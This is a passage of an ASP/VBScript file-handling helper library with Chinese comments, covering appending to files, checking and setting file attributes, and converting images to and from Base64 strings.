    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FileExists(FileName) = True Then
            Set FText = Fso.OpenTextFile(FileName, 8)
                FText.WriteLine(Content)
            Set FText = Nothing
            AddToFile = "追加信息成功"
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "AddToFile 追加文件信息 函数出错，FileName=" & FileName & "<br>Content字符长" & Len(Content) & " Content类型" & TypeName(Content) & "【" & Content & "】"
End Function
Function ExistsZhiDuFile(ByVal FileName)
    On Error Resume Next
    Dim Fso, OpenFile
    ExistsZhiDuFile = False
    Call HandlePath(FileName)'获得完整路径
    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FileExists(FileName) = True Then
            Set OpenFile = Fso.GetFile(FileName)
                ExistsZhiDuFile = OpenFile.Attributes
            Set OpenFile = Nothing
            If ExistsZhiDuFile >= 128 Then ExistsZhiDuFile = ExistsZhiDuFile - 128
            If ExistsZhiDuFile >= 64 Then ExistsZhiDuFile = ExistsZhiDuFile - 64
            If ExistsZhiDuFile >= 32 Then ExistsZhiDuFile = ExistsZhiDuFile - 32
            If ExistsZhiDuFile >= 8 Then ExistsZhiDuFile = ExistsZhiDuFile - 8
            If ExistsZhiDuFile >= 4 Then ExistsZhiDuFile = ExistsZhiDuFile - 4
            If ExistsZhiDuFile >= 2 Then ExistsZhiDuFile = ExistsZhiDuFile - 2
            ExistsZhiDuFile = CBool(ExistsZhiDuFile)'让它成为布而类型
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "ExistsZhiDuFile 判断只读文件 函数出错，FileName=" & FileName
End Function

Function EditFileAttribute(ByVal FileName, ByVal N)
    On Error Resume Next
    Dim Fso, OpenFile
    Call HandlePath(FileName)'获得完整路径
    EditFileAttribute = False
    Set Fso = CreateObject("Scripting.FileSystemObject")
        If Fso.FileExists(FileName) = True Then
            Set OpenFile = Fso.GetFile(FileName)
                OpenFile.Attributes = N'32文件
            Set OpenFile = Nothing
            EditFileAttribute = True
        End If
    Set Fso = Nothing
    If Err Then doError Err.Description, "EditFileAttribute 修改文件属性 函数出错，FileName=" & FileName
End Function

'图片转Base64 20150722引用网上 call echo("images/error.gif",ImagesToBase64("images/error.gif"))
Function ImagesToBase64(FileName)
    Dim xml
    Dim root
    Dim Fs
    Dim FilePath
    Dim objStream
    Dim objXMLDoc
    Dim Base64
    Dim getFileExt
     '定义变量完结
     '创建对像
    FilePath = HandlePath(FileName)
    getFileExt = Mid(FilePath, InStrRev(FilePath, ".") + 1)
    Set objXMLDoc = CreateObject("msxml2.FreeThreadedDOMDocument")
        '设定生成XML文档的根为 Base64Data
        objXMLDoc.loadxml "<?xml version='1.0'?><Base64Data />"
        Set Fs = CreateObject("Scripting.FileSystemObject")    ''服务器需要FSO组件
            If Fs.FileExists(FilePath) Then                                                 '判断File文件是否存在
                '用 stream 来读取数据
                Set objStream = CreateObject("ADODB.Stream")
                    objStream.Type = 1
                    objStream.Open
                    objStream.LoadFromFile FilePath


                    objXMLDoc.documentElement.DataType = "bin.base64"
                    objXMLDoc.documentElement.nodeTypedValue = objStream.Read
                    '数据流读取结束.得到了值 objXMLDoc
                     '创建XML文件
                    Set xml = CreateObject("msxml2.FreeThreadedDOMDocument")
                        xml.Load objXMLDoc
                        If xml.ReadyState > 2 Then
                            Set root = xml.getElementsByTagName("Base64Data")
                                'Base64="<img src=""data:image/"&getFileExt&";base64,"&vbcrlf&root.Item(0).Text&""">"
                                'Base64 = "data:image/" & getFileExt & ";base64," & vbCrLf & root.item(0).text
                                Base64 = root.Item(0).Text
                        Else
                            Base64 = ""
                        End If
                            Set xml = Nothing
                    Set objStream = Nothing
            Else
                Base64 = ""
            End If

                Set Fs = Nothing
        Set objXMLDoc = Nothing


        ImagesToBase64 = Base64
End Function

'Base64转图片 20150722 引用网上   call Base64ToImages("1.jpg",Base64Data)
Function Base64ToImages(saveImagePath, Base64Data)
    Dim XmlStr
    saveImagePath = HandlePath(saveImagePath)
    XmlStr = "<data>" & Base64Data & "</data>"
    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
        Dim Stm: Set Stm = CreateObject("ADODB.Stream")
            xml.resolveExternals = False
            xml.loadxml (XmlStr)
            xml.documentElement.setAttribute "xmlns:dt", "urn:schemas-microsoft-com:datatypes"
            xml.documentElement.DataType = "bin.base64"
            Stm.Type = 1                                                                    'adTypeBinary
            Stm.Open
            Stm.Write xml.documentElement.nodeTypedValue
            Stm.SaveToFile saveImagePath
            Stm.Close
        Set xml = Nothing
    Set Stm = Nothing
End Function

%> 


